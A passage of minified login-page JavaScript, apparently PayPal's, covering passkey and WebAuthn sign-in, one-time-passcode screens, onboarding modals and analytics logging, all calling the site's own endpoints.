login.logger.pushLogs()}if(t&&t.webAuthnLoginHtml&&(e.update({webAuthnLoginPage:t.webAuthnLoginHtml}),d(t.webAuthnLoginHtml)),a&&!c)return f?(login.logger.log({evt:r,data:"SKIP_WEBAUTHN_JUNO_LOOKUP",calEvent:!0}),void login.logger.pushLogs()):void y().then((function(e){return e.webAuthnLoginContext?(login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_context_lookup_success",instrument:!0}),login.logger.log({evt:r,data:"PROCESS_LOGIN_CONTEXT_LOOKUP_SUCCESS",calEvent:!0,status:"ERROR"}),login.logger.pushLogs(),void $("body").attr("data-web-authn-login-context",e.webAuthnLoginContext)):Promise.reject("service error")})).catch((function(){login.logger.log({evt:"state_name",data:"webauthn_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_login_context_lookup_failed_page_render",instrument:!0}),login.logger.log({evt:r,data:"PROCESS_LOGIN_CONTEXT_LOOKUP_FAILED_PAGE_RENDER",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}))}},performWebAuthnLogin:v,attachFormEvent:h,setPasskeyContext:function p(){if(($("body").data("usePassKey")||$("body").data("passKeyPlatform"))&&window.PublicKeyCredential&&window.PublicKeyCredential.isConditionalMediationAvailable&&window.PublicKeyCredential.isConditionalMediationAvailable()){t.addHiddenElementIfNotExist("allowPasskeyAutofill","true",document.querySelector("form[name=login]")),document.body.setAttribute("data-allow-passkey-autofill","true");var n=document.querySelector("input[name=login_email]")||{};n&&n.autocomplete.indexOf("webauthn")<0&&(n.autocomplete+=" webauthn");var r=new MutationObserver((function(e){e.forEach((function(e){"attributes"===e.type&&"data-passkey-assertion"===e.attributeName&&(login.logger.log({evt:"variant",data:"uncookied_passkey_autofill",instrument:!0}),login.logger.log({evt:"event_name",data:"identity_login_trigger_occurred",instrument:!0}),login.logger.log({evt:"product",data:"identity",instrument:!0}),login.logger.log({evt:"state_name",data:"begin_passkey_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_assertion_success",instrument:!0}),v({passKeyAutoFill:!0}))}))}));r.observe(document.body,{attributes:!0})}}}}(),login.webAuthnUtils={checkCalLogsType:function e(e,t){return"true"===e?"PASSKEY_CLIENT":t?"UNCOOKIED_PASSKEY_IGNORE_CLIENT":"passkey"===e?"COOKIED_PASSKEY_CLIENT":"uncookiedAutofill"===e?"UNCOOKIED_PASSKEY_AUTOFILL_CLIENT":"WEBAUTH_N_CLIENT"}},login.webAuthnOptInXHR=function(){function e(e){return btoa(new Uint8Array(e).reduce((function(e,t){return e+String.fromCharCode(t)}),""))}function t(e){return Uint8Array.from(atob(e),(function(e){return e.charCodeAt(0)}))}function n(e){var r,n={};if(!e.response)throw new Error("no_bind_challenge_available");return r=e.response||{},n.publicKey={rp:{id:r.rp.id,name:r.rp.name},user:{id:t(r.user.id),name:r.user.name||"",displayName:r.user.displayName||""},challenge:t(r.challenge),pubKeyCredParams:r.pubKeyCredParams,authenticatorSelection:{authenticatorAttachment:"platform"}},navigator.credentials.create(n)}function r(t){var n={};if("id"in t&&(n.id=t.id),"type"in t&&(n.type=t.type),"rawId"in t&&(n.rawId=e(t.rawId)),"response"in t){var r={};return r.clientDataJSON=e(t.response.clientDataJSON),r.attestationObject=e(t.response.attestationObject),n.response=r,login.utils.makeServerRequestAndReturnPromise("/signin/webauthn/process-credential",{data:{webauthn_response:JSON.stringify(n),flowId:login.utils.getFlowId()}})}return Promise.reject(!1)}return function(){var t="WEBAUTH_N_CLIENT";return login.utils.makeServerRequestAndReturnPromise("/signin/webauthn/get-create-challenge",{data:{flowId:login.utils.getFlowId()}}).then(n).catch((function(e){login.logger.log({evt:"fp_optin_error",data:"create_credential_failed_XHR",instrument:!0});var n=e&&e.toString()||"unknown_error";login.logger.log({evt:t,data:"CREATE_CREDENTIAL_FAILED_XHR"+n,status:"ERROR",calEvent:!0}),login.logger.log({evt:"ext_error_desc",data:n,instrument:!0})})).then(r).catch((function(){login.logger.log({evt:"fp_optin_error",data:"process_credential_failed",instrument:!0}),login.logger.log({evt:t,data:"PROCESS_CREDENTIAL_FAILED",status:"ERROR",calEvent:!0})})).then((function(e){if(!e||!e.bindSuccess)return Promise.reject(!1);var t=document.body.getAttribute("data-party-id-hash");return e.wanId&&t&&login.storageUtils.setDataByUserId("wanId",e.wanId,t),Promise.resolve({msg:"success"})})).catch((function(){return login.logger.log({evt:"fp_optin_error",data:"bind_credential_failed",instrument:!0}),login.logger.log({evt:t,data:"BIND_CREDENTIAL_FAILED",calEvent:!0}),login.logger.pushLogs(),Promise.reject(!1)}))}}(),login.tpdLogin=function(){function n(e){e&&(login.logger.log({evt:"state_name",data:e.stateName,instrument:!0}),login.logger.log({evt:"transition_name",data:e.transitionName,instrument:!0}),e.calName&&login.logger.log({evt:"TPD_CLIENT",data:e.calName,calEvent:!0}),login.logger.pushLogs())}function s(){n({stateName:"begin_tpd",transitionName:"process_pwd_tpd_auto",calName:"AUTO_TPD_LOGIN"})}function l(n){var r=document.querySelectorAll("form[name=login] input"),i={},s=$("body").data("tpdVariant");$("body").data("isPrefillEmailEnabled")&&$("body").data("tpdDemo")&&document.body.removeAttribute("data-is-prefill-email-enabled"),e.showSpinner();for(var o=0;o<r.length;o++)i[r[o].name]=r[o].value;"true"===i.tpdEligible?(i.splitLoginContext="tpd",delete i.login_password,delete i.login_pin,i.tpdVariant=n,i.originalVariant=s,login.fn.addFnSyncData(),$.ajax({url:t.getAttribute("action"),method:"POST",data:i,success:e.successfulXhrHandler,fail:e.failedXhrSubmitHandler})):e.hideSpinner()}var e=login.utils,t=document.querySelector("form[name=login]");return{instrumentVerificationViewRendered:function r(){n({stateName:"begin_tpd",transitionName:"prepare_verification"})},instrumentTpdLoginClicked:function i(e){n({stateName:"begin_pwd",transitionName:"process_pwd_tpd_click",calName:"INIT_TPD"+(e&&"_"+e)})},instrumentTpdLoginAutoTriggered:s,instrumentNotYouClicked:function o(){n({stateName:"begin_tpd",transitionName:"process_not_you",calName:"PROCESS_NOT_YOU"})},instrumentResendClicked:function u(){n({stateName:"begin_tpd",transitionName:"process_resend",calName:"PROCESS_RESEND"})},instrumentUsePasswordInstead:function a(e){switch(e){case"passwordReason1":n({stateName:"begin_use_pwd",transitionName:"process_no_phone",calName:"USE_PASSWORD_NO_PHONE"});break;case"passwordReason2":n({stateName:"begin_use_pwd",transitionName:"process_no_notification",calName:"USE_PASSWORD_NO_NOTIFICATION"});break;case"passwordReason3":n({stateName:"begin_use_pwd",transitionName:"process_prefer_password",calName:"USE_PASSWORD_PREFER_PASSWORD"});break;case"passwordReason4":n({stateName:"begin_use_pwd",transitionName:"process_try_later",calName:"USE_PASSWORD_TRY_LATER"});break;case"passwordReason5":n({stateName:"begin_use_pwd",transitionName:"process_other",calName:"USE_PASSWORD_OTHER"});break;default:n({stateName:"begin_tpd",transitionName:"process_use_pwd",calName:"USE_PASSWORD"})}},initialize:function c(){var e=$("body").data("tpdAutoSend");login.utils.isTpdDemo()||"true"===e&&(s(),l("autoSend"))},attemptTpdLogin:l,instrumentTpdExpired:function f(e){n({stateName:"end_tpd_notification",transitionName:"expired_tpd_no_action",calName:"EXPIRED_TPD_"+e})}}}(),login.xoPlanning={triggerSetBuyerCall:function e(e,t){if(e){var n={_csrf:login.utils.getCSRFToken(),setBuyer:e,context_id:login.utils.getFlowId()};t&&(n.otPlan=!0),$.ajax({type:"POST",url:"/signin/plan",data:n,dataType:"json",success:function(e){login.utils.setCSRFToken(e&&e._csrf)},fail:function(e){},complete:function(){}})}}},login.onboardingFlow=function(){function o(e){var r;return!!i&&(""===(r=e.field.value.replace(t,""))?(c(e),void("email"===e.type&&m(e))):(function v(e){$(e.errMsg).addClass("hide")}(e),void("email"===e.type&&$(e.field).hasClass("validate")?r.match(n)?(m(e),d(e,!0)):(h(e),p(e)):d(e,!0))))}function u(e){i=!1,d(e)}function a(e){i=!!$(e.container).hasClass("hasError")}function l(e){var t=document.querySelector(".notifications");$(t).text(""),e&&e.msg&&(t.innerHTML='<p class="notification '+e.type+'" role="alert">'+e.msg+"</p>")}function c(e){$(e.errMsg).removeClass("hide")}function h(e){$(e.container).addClass("hasError"),e.container.style["z-index"]=100,$(e.errMsgContainer).addClass("show"),e.field.focus()}function p(e){$(e.invalidMsg).removeClass("hide")}function d(e,t){t&&$(e.container).removeClass("hasError"),e.container.style["z-index"]=1,$(e.errMsgContainer).removeClass("show")}function m(e){$(e.invalidMsg).addClass("hide")}function g(e){if(e&&"string"==typeof e)return e.replace(t,"")}function y(e){return!(!e.field.value.replace(t,"").match(n)&&!e.field.hasAttribute("disabled"))||(h(e),p(e),!1)}function b(e){var t=e&&e.field&&g(e.field.value);return!!(e&&e.field&&e.field.hasAttribute("disabled"))||(t?!t||!t.match(r)||(h(e),p(e),!1):(h(e),c(e),!1))}function w(t){var n,r=getEventTarget(t),o=document.getElementById("loginToContinue"),u=r.querySelectorAll("input")||[],a=document.querySelector("#token")||{},f={},c=login.utils.getSplitLoginContext();if(eventPreventDefault(t),i=!0,(n=b(e))&&$(e.field).hasClass("validate")&&"inputEmail"===c&&(n=y(e)),n){for(var h=0;h<u.length;h++)f[u[h].name]=u[h].value;login.utils.showSpinner(),login.logger.log({evt:"state_name",data:"begin_signup_interstitial",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_continue",instrument:!0}),login.logger.pushLogs(),$.ajax({url:r.getAttribute("action"),type:"POST",data:f,success:function d(e){(e=e||{}).email&&s.update({email:e.email}),e.notifications&&(l(e.notifications),a.value=e._csrf,login.utils.hideSpinner()),e&&e.returnUrl&&!e.notifications?window.location.href=e.returnUrl:(e.loginToContinueContent&&o&&(o.textContent=e.loginToContinueContent),function p(e){var t=$("#accExists"),n=$("#otpLoginContainer"),r=$("#loginContainer"),i=$("#modalEmail"),s=$(".grayMask"),o=document.querySelector("form[name=beginOnboardingFlow]");if(!e.showModal&&"otpLogin"===e.loginButton&&e.otpMayflyKey&&o)return login.otp.hideOnboardingModal=!0,login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_account_exists",instrument:!0}),login.logger.log({evt:"redirect_reason",data:"otp_primary_eligible",instrument:!0}),login.logger.pushLogs(),login.utils.addHiddenElement("otpMayflyKey",e.otpMayflyKey,o),void login.otp.prepareSendPage({integrationType:"onOnboardingFlow",otpLoginEligible:"true"});e.showModal&&t&&s&&(login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_account_exists",instrument:!0}),login.logger.pushLogs(),t.removeClass("hidden"),s.removeClass("hidden")),i&&e.email&&i.text(e.email),"otpLogin"===e.loginButton&&n&&r&&e.otpMayflyKey&&o&&(n.removeClass("hidden"),r.addClass("hidden"),login.utils.addHiddenElement("otpMayflyKey",e.otpMayflyKey,o)),"otpLogin"!==e.loginButton&&n&&r&&(n.addClass("hidden"),r.removeClass("hidden"))}(e),e.showModal&&login.utils.hideSpinner())},fail:function(){login.utils.hideSpinner()}})}}function E(){var e=$("#accExists"),t=$(".grayMask"),n=document.getElementById("onboardingFlowEmail");login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_close",instrument:!0}),login.logger.pushLogs(),e&&t&&(t.addClass("hidden"),e.addClass("hidden")),n&&(n.value="")}function S(){var e=document.getElementById("btnNext"),t=s.get("email");eventPreventDefault(),e&&t?(login.utils.showSpinner(),login.utils.submitPublicCredential(t)):function x(){var e=document.querySelector('#main section[id="onboardingFlow"]');$(e).remove(),$("#login").removeClass("hide")}()}function T(){var t=document.querySelector("#onboardingFlow .proceed"),n=document.getElementById("accExistsCancel"),r=document.getElementById("passwordLogin"),i=document.getElementById("otpLogin"),s=document.getElementById("loginWithPassword"),f=document.getElementById("onboardingFlowMask"),l=document.querySelector(".secondaryLink a"),c=document.querySelector("#guestCheckoutLink"),h=document.getElementById("onboardingFlowEmail");e={container:document.querySelector("#login_emaildiv"),field:document.querySelector("#onboardingFlowEmail"),label:document.querySelector('label[for="email"]'),errMsgContainer:document.querySelector("#emailErrorMessage"),errMsg:document.querySelector("#emailErrorMessage .emptyError"),invalidMsg:document.querySelector("#emailErrorMessage .invalidError"),phoneEmailToggleIcon:document.querySelector("#login_emaildiv .icon"),type:"email"},h.focus(),e.field&&(e.field.onkeyup=o.bind(null,e),e.field.onblur=u.bind(null,e),e.field.onfocus=a.bind(null,e)),addEvent(t,"submit",w),addEvent(n,"click",E),addEvent(f,"click",E),addEvent(r,"click",(function(){login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_login_button_click",instrument:!0}),login.logger.pushLogs(),S()})),addEvent(l,"click",(function(){login.logger.log({evt:"state_name",data:"begin_signup_interstitial",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_login_button_click",instrument:!0}),login.logger.pushLogs(),S()})),addEvent(c,"click",(function(e){eventPreventDefault(e),login.utils.getOutboundLinksHandler(c)(e),login.logger.log({evt:"state_name",data:"begin_signup_interstitial",instrument:!0}),login.logger.log({evt:"transition_name",data:"guest_checkout_link_click",instrument:!0}),login.logger.pushLogs()})),addEvent(i,"click",(function(){eventPreventDefault(),login.otp&&(login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_otp_link",instrument:!0}),login.logger.pushLogs(),login.otp.prepareSendPage({integrationType:"onOnboardingFlow",otpLoginEligible:"true"}))})),addEvent(s,"click",(function(){login.logger.log({evt:"state_name",data:"begin_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_login_button",instrument:!0}),login.logger.pushLogs(),S()}))}function N(e){(function f(e){for(var t=document.querySelector("#main"),n=t.querySelectorAll("section")||[],r=0;r<n.length;r++){var i=n[r].querySelector(".notifications");i&&$(i).text()&&$(i).text(""),$(n[r]).hasClass("hide")||$(n[r]).addClass("hide")}t.insertAdjacentHTML("afterbegin",e),login.footer&&login.footer()})(e),T()}function C(e){for(var n=document.querySelector(".proceed").querySelectorAll("input")||[],r=document.querySelector("#token")||{},i={},s=0;s<n.length;s++)i[n[s].name]=n[s].value;e&&(i.isForcedSignup=e.isForcedSignup),login.utils.showSpinner(),$.ajax({url:"/signin/onboarding/landing",type:"POST",data:i,success:function o(e){return e.notifications?(l(e.notifications),r.value=e._csrf,void login.utils.hideSpinner()):e.isTeslaSignUpRequired?(login.logger.log({evt:"state_name",data:"begin_tesla_signup",instrument:!0}),login.logger.log({evt:"transition_name",data:"tesla_signup_button_clicked",instrument:!0}),login.logger.pushLogs(),void(window.location.href=e.signUpEndPoint)):(e.html&&(login.logger.log({evt:"state_name",data:"begin_signup_interstitial",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_email",instrument:!0}),login.logger.pushLogs(),N(e.html)),void login.utils.hideSpinner())},fail:function(){login.utils.hideSpinner()}})}function L(){s.clear("email")}var e={},t=login.utils.getEmptyPattern(),n=login.utils.getEmailPattern(),r=login.utils.getInvalidUserIdPattern(),i=!1,s=login.utils.createCache();return{prepareLandingPage:function(e){e=e||{},function k(){var e=document.querySelector("#startOnboardingFlow"),t=document.querySelector("#startGuestOnboardingFlow"),n=document.querySelector("#startGuestOnboardingFlowWithPwdKey");addEvent(e,"click",(function(e){eventPreventDefault(e),L(),C({isForcedSignup:!0})})),addEvent(t,"click",(function(e){eventPreventDefault(e),L(),C({isForcedSignup:!1})})),addEvent(n,"click",(function(e){eventPreventDefault(e),L(),C({isForcedSignup:!1})}))}(),login.pubsub.subscribe("CLEAR_ONBOARDING_FLOW_CONTEXT",L)}}}(),login.noAccExists=function(){function t(){var e=$("#noAccExists"),t=$(".grayMask"),n=document.querySelector("#email");e&&t&&(t.addClass("hidden"),e.addClass("hidden")),login.logger.log({evt:"state_name",data:"begin_no_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_close",instrument:!0}),login.logger.pushLogs(),n.focus()}return{attachFormEvent:function n(){var e=document.getElementById("noAccExistsCancel"),n=document.getElementById("noAccExistsMask"),r=document.getElementById("signUp");addEvent(e,"click",t),addEvent(n,"click",t),addEvent(r,"click",(function(){login.logger.log({evt:"state_name",data:"begin_no_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_signup",instrument:!0}),login.logger.pushLogs()}))},showNoAccExistsView:function e(e){var t=$("#noAccExists"),n=$("#modalEmail"),r=$(".grayMask");e.showNoAccExists&&t&&r&&(login.logger.log({evt:"state_name",data:"begin_no_account_exists",instrument:!0}),login.logger.log({evt:"transition_name",data:"prepare_no_account_exists",instrument:!0}),login.logger.pushLogs(),t.removeClass("hidden"),r.removeClass("hidden")),n&&e.login_email&&n.text(e.login_email)}}}(),login.otp=function(){function u(e){for(var t=document.querySelector("#main"),n=t.querySelectorAll("section")||[],r=0;r<n.length;r++){var i=n[r].querySelector(".notifications");i&&$(i).text()&&$(i).text(""),$(n[r]).hasClass("hide")||$(n[r]).addClass("hide")}t.insertAdjacentHTML("afterbegin",e),login.footer&&login.footer(),login.countryList&&login.countryList.getCache("countryList")&&login.countryList.showCountryDropDown()}function a(e){var t=document.querySelector(".notifications");$(t).text(""),e&&e.msg&&(t.innerHTML='<p class="notification '+e.type+'" role="alert">'+e.msg+"</p>")}function f(e){var n=document.querySelector(".otpDisplayCredentials a");n&&addEvent(n,"click",(function(n){eventPreventDefault(n),login.utils.notYouClickHandlerForCookiedUser(n,(function(){login.utils.showSpinner({nonTransparentMask:!0}),login.logger.log({evt:"state_name",data:"begin_"+e.stateName,instrument:!0}),login.logger.log({evt:"transition_name",data:"click_not_you"+(t?"_"+t:""),instrument:!0}),login.logger.pushLogs()}))}))}function h(){for(var e=$("body").data("loadStartTime"),n=$("body").data("isCookiedUser"),r=document.querySelectorAll("input")||[],s=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value?"email_":"",o={},u=0;u<r.length;u++)o[r[u].name]=r[u].value;var a=o.otpNewExp;if(document.querySelector("#verifyOtp")&&(o.autoSmsSent||o.autoEmailSent||o.autoSmsClick||o.autoEmailClick)){if(login.utils.logCPLData({startTime:e,status:"success",flowName:n?"OTP Auto Sms send code Cookied":"OTP Auto Sms send code Uncookied"}),a){verifyOtpPrimary().attachFormEvents();var f=document.querySelector('#main section[id="verifyOtp"] .rewardsBar');login.utils.attachCloseRewardsBarHandler(f)}else verifyOtp().attachFormEvents();m({stateName:"verify_otp"}),login.logger.log({evt:"login_method",data:"otp",instrument:!0}),login.logger.clientLog([{evt:"event_name",data:"identity_"+s+"otp_verify_screen_rendered",instrument:!0},{evt:"state_name",data:"begin_verify_"+s+"otp",instrument:!0},{evt:"transition_name",data:"prepare_verify_"+s+"otp"+(t?"_"+t:""),instrument:!0}]);try{var l=JSON.parse(window.localStorage.getItem("ulData"))||{};login.utils.logCPLData({startTime:n?e:l.startTime,status:"success",flowName:n?"OTP Auto Sms_Cookied":"OTP Auto Sms_Uncookied"})}catch(c){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}document.querySelector("#otp1").click()}}function p(n){$("body").data("loadStartTime");var i=$("body").data("isCookiedUser");try{login.utils.logCPLData({startTime:s,status:"success",flowName:i?"OTP Non Auto Sms send code Cookied":"OTP Non Auto Sms send code Uncookied"})}catch(f){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}var l,c=document.querySelector("form[name=sendOtp]")||{},h=getEventTarget(n),p=(n?h.querySelectorAll("input"):c.querySelectorAll("input"))||[],d=c.getAttribute("action"),v=document.querySelector("#token")||{},g=document.querySelector(".selectPhoneChallenges select"),y=document.querySelector(".selectEmailChallenges select"),b={},E=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value?"email_":"";eventPreventDefault(n),login.logger.clientLog([{evt:"event_name",data:"identity_"+E+"otp_primary_screen_button_pressed",instrument:!0},{evt:"state_name",data:"begin_"+E+"otp_interstitial",instrument:!0},{evt:"transition_name",data:"get_a_"+E+"code",instrument:!0}]);for(var S=0;S<p.length;S++)b[p[S].name]=p[S].value;var x=b.otpNewExp;if(g){var T=g.options[g.selectedIndex];b.challengeId=T.value,b.maskedPhoneNumber=$(T).text()}if(y){T=y.options[y.selectedIndex];b.challengeId=T.value,b.maskedEmailAddress=$(T).text()}login.utils.showSpinner(),l=Date.now(),$.ajax({url:n?h.getAttribute("action"):d,type:"POST",data:b,success:function N(n){n=n||{};var r=document.querySelector('input[name="autoSmsClick"]'),s=document.querySelector('input[name="autoEmailClick"]');if(n.notifications&&(a(n.notifications),v.value=n._csrf,login.utils.hideSpinner()),n.html&&(u(n.html),r||s)){var f=document.createElement("div");f.innerHTML=n.html,f.querySelector('input[name="autoSmsClick"]').value=!1,f.querySelector('input[name="autoEmailClick"]').value=!1,e.update({autoSendSmsChallengePage:f.innerHTML})}document.querySelector("#verifyOtp")&&(o=Date.now(),$("#otpLogin").remove(),x?verifyOtpPrimary().attachFormEvents():verifyOtp().attachFormEvents(),m({stateName:"verify_otp"}),login.logger.clientLog([{evt:"event_name",data:"identity_"+E+"otp_verify_screen_rendered",instrument:!0},{evt:"state_name",data:"begin_verify_"+E+"otp",instrument:!0},{evt:"transition_name",data:"prepare_verify_"+E+"otp"+(t?"_"+t:""),instrument:!0}]),login.utils.logCPLData({startTime:l,status:"success",flowName:i?"OTP Non Auto Sms_Cookied":"OTP Non Auto Sms_Uncookied"})),login.utils.hideSpinner(),document.querySelector("#otp1").click()},fail:function(){login.utils.logCPLData({startTime:l,status:"failure",flowName:i?"OTP Non Auto Sms_Cookied":"OTP Non Auto Sms_Uncookied"}),login.utils.hideSpinner()}})}function d(){n&&n.hasAttribute("disabled")&&n.removeAttribute("disabled"),r&&r.hasAttribute("disabled")&&r.removeAttribute("disabled")}function v(){var e=document.querySelector("#main section");$(e).remove(),d(),$("#login").removeClass("hide");var t=document.querySelector('#main section[id="login"] .rewardsBar');login.utils.attachCloseRewardsBarHandler(t),x({loginPreference:"password_login"}),login.logger.log({evt:"login_method",data:"password",instrument:!0})}function m(e){var t=document.querySelector(".secondaryLink a"),n=document.querySelector("form[name=sendOtp] input[name=otpVariant]")||document.querySelector("form[name=verifyOtp] input[name=otpVariant]"),r=document.querySelector("form[name=sendOtp] input[name=email]")||document.querySelector("form[name=verifyOtp] input[name=email]"),i=$("#beginOtpLogin"),s=document.querySelector("[name=isTawFullPage]"),o=s&&"true"===s.value;addEvent(t,"click",(function(){eventPreventDefault(event),PAYPAL.unifiedLoginInlinePostMessage?login.utils.sendPostMessage("NOT_NOW"):o?login.tryAnotherWayFullPage&&login.tryAnotherWayFullPage.loginWithPasswordFullPageHandler():(n&&"onOnboardingFlow"===n.value&&r&&r.value?(login.utils.showSpinner(),login.utils.submitPublicCredential(r.value)):v(),i&&i.hasClass("hidden")&&i.removeClass("hidden"),login.logger.log({evt:"state_name",data:"begin_"+e.stateName,instrument:!0}),login.logger.log({evt:"transition_name",data:"click_login_another_way",instrument:!0}),login.logger.pushLogs())}))}function g(e){var t=document.querySelector(".selectedPhoneChallenge span"),n=getEventTarget(e),r=$(n.options[n.selectedIndex]).text();login.logger.log({evt:"state_name",data:"begin_verify_otp",instrument:!0}),login.logger.log({evt:"transition_name",data:"existing_linked_number_changed",instrument:!0}),login.logger.pushLogs(),$(t).text(r)}function y(e){var t=document.querySelector(".selectedEmailChallenges span"),n=getEventTarget(e),r=$(n.options[n.selectedIndex]).text();login.logger.log({evt:"state_name",data:"begin_verify_otp",instrument:!0}),login.logger.log({evt:"transition_name",data:"existing_email_changed",instrument:!0}),login.logger.pushLogs(),$(t).text(r)}function b(){var e=document.querySelector("#otpLogin .proceed"),t=document.querySelector(".selectPhoneChallenges select"),n=document.querySelector(".selectEmailChallenges select"),r=document.querySelector("#tryAnotherWayLink"),i=document.querySelector('#main section[id="otpLogin"] .rewardsBar'),s=document.querySelector(".rewardsBarMobile"),o=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value,a=($("#verifyOtp")&&!$("#verifyOtp").hasClass("hide")?"verify":"")+(o?"emailOtp":"otp"),d=login.utils.getPageNameByIntegrationType(a);e&&addEvent(e,"submit",p),function O(e){for(var t=document.querySelector("#otpLogin .proceed"),n=t&&t.querySelectorAll("input")||[],r={},i=document.querySelector(".transitioning"),s=0;s<n.length;s++)r[n[s].name]=n[s].value;"true"!==r.autoSmsClick&&"true"!==r.autoEmailClick||($(i).addClass("nonTransparentMask"),p())}(),h(),m({stateName:"otp_interstitial"}),f({stateName:"verify_otp"}),login.utils.attachCloseRewardsBarHandler(i),login.utils.attachCloseRewardsBarHandler(s),function l(){var e=document.querySelector(".otpLoginPrimary #signupContainer"),t=document.querySelector(".otpLoginPrimary #createAccount"),n=t&&t.getAttribute("href");e&&n&&addEvent(t,"click",(function(e){eventPreventDefault(e),login.logger.log({evt:"state_name",data:"begin_otp",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_onboarding",instrument:!0}),login.logger.pushLogs(),window.location.href=n}))}(),function c(){var e=document.querySelector(".otpLoginPrimary #forgotPasswordModal"),t=e&&e.getAttribute("href");e&&t&&addEvent(e,"click",(function(e){eventPreventDefault(e),login.logger.log({evt:"state_name",data:"begin_otp",instrument:!0}),login.logger.log({evt:"transition_name",data:"process_setup_pwd",instrument:!0}),login.logger.pushLogs(),window.location.href=t}))}(),r&&(login.utils.logTryAnotherWayInstrumentData({page:d,action:"linkShown"}),login.logger.pushLogs(),login.utils.hideCurrentPageTawOption(a),addEvent(r,"click",(function(e){login.logger.log({evt:"state_name",data:"otp_login",instrument:!0}),login.logger.log({evt:"transition_name",data:"otp_try_another_way_clicked",instrument:!0}),login.logger.log({evt:"otp_login",data:"otp_try_another_way_clicked",calEvent:!0}),login.logger.pushLogs(),login.utils.logTryAnotherWayInstrumentData({page:d,action:"linkPressed"}),login.logger.pushLogs(),login.utils.showTryAnotherWayModal(e,{integrationType:a})})),login.utils.attachTryAnotherWayModalHandlers({integrationType:a})),login.pubsub.subscribe("SHOW_PASSWORD",v),t&&addEvent(t,"change",g),n&&addEvent(n,"change",y)}function w(e){u(e);var n=$("body").data("loadStartTime"),r=$("body").data("isCookiedUser"),i=document.querySelector("#otpLogin"),a=document.querySelector('input[name="isEmailOtp"]')&&"true"===document.querySelector('input[name="isEmailOtp"]').value?"email_":"";if(b(),login.logger.log({evt:"login_method",data:"otp",instrument:!0}),login.logger.clientLog([{evt:"event_name",data:"identity_"+a+"otp_primary_screen_rendered",instrument:!0},{evt:"state_name",data:"begin_"+a+"otp_interstitial",instrument:!0},{evt:"transition_name",data:a+"otp_interstitial"+(t?"_"+t:""),instrument:!0}]),i)try{var f=JSON.parse(window.localStorage.getItem("ulData"))||{},l=login.utils.tawClickTimes.smsOtp||login.utils.tawClickTimes.emailOtp;l?(login.utils.logCPLData({startTime:l,status:"success",flowName:"TAW Lead on OTP"}),login.utils.tawClickTimes={}):login.utils.logCPLData({startTime:r?n:f.startTime,status:"success",flowName:r?"Lead on OTP_Cookied":"Lead on OTP_Uncookied"}),s=Date.now()}catch(c){login.logger.log({evt:"UNIFIED_LOGIN",data:"local_storage_error_out",calEvent:!0,status:"ERROR"}),login.logger.pushLogs()}}function E(i){var s=document.querySelector("#login"),o=s.querySelector("#beginOtpLogin a")||s.querySelector("#beginOtpLogin button"),u=o&&$(o.parentNode),a=s.querySelector("#loginWithOtp"),f=s.querySelector("#loginWithEmailOtp"),l=a&&a.parentElement,c=f&&f.parentElement,h=$("body").data("otpLoginIntegrationType")||"",p=$("body").data("pwdShowTryAnotherWay")||document.querySelector('input[name="pwdShowTryAnotherWay"]'),d=i&&i.phoneAvailable,v=i&&i.emailAvailable,m=document.querySelector('input[name="autoSmsClick"]'),g=document.querySelector('input[name="autoEmailClick"]'),y=i&&i.autoSmsClick||m&&m.value,b=i&&i.autoEmailClick||g&&g.value;(!y&&!b||!document.querySelector("#otpLogin"))&&login.utils.hideSpinner(),l&&l.classList&&d&&l.classList.remove("hide"),c&&c.classList&&v&&c.classList.remove("hide"),o&&u&&addEvent(o,"click",(function(s){eventPreventDefault(s),login.logger.log({evt:"state_name",data:"begin_pwd",instrument:!0}),login.logger.log({evt:"transition_name",data:"click_otp_login"+(t?"_"+t:""),instrument:!0}),login.logger.log({evt:"OTP_LOGIN",data:"CLICK_VIA_LINK",calEvent:!0}),login.logger.pushLogs();var o=i&&i.autoSmsClick||document.querySelector('input[name="autoSmsClick"]'),u=i&&i.autoEmailClick||document.querySelector('input[name="autoEmailClick"]');document.body.setAttribute("data-auto-sms-click",o),document.body.setAttribute("data-auto-email-click",u);var a=o||u?"autoSendSmsChallengePage":"sendSmsChallengePage";e.get(a)&&(w(e.get(a)),n.hasAttribute("disabled")||n.setAttribute("disabled","disabled"),r.hasAttribute("disabled")||r.setAttribute("disabled","disabled")),x({loginPreference:"otp_login"})})),p||"via_link"!==h?(!p&&"via_button"===h&&u&&u.removeClass("hidden"),p&&void 0!==d&&void 0!==v&&S({phoneAvailable:d,emailAvailable:v})):u&&u.removeClass("notVisible")}function S(e){var 